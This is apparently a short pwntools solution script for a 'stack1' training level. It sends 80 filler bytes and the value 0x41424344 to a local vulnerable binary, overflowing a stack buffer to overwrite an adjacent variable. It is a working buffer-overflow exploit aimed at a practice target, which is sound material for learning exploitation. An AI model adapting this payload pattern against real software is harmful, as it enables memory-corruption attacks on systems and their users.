from pwn import *

filename = "stack1"
PATH = '../bin/' + filename

# context.log_level = 'debug'

p = process(PATH)

payload = b'A'*80   
payload += p32(0x41424344)
p.sendline(payload)
p.interactive()

p.close()
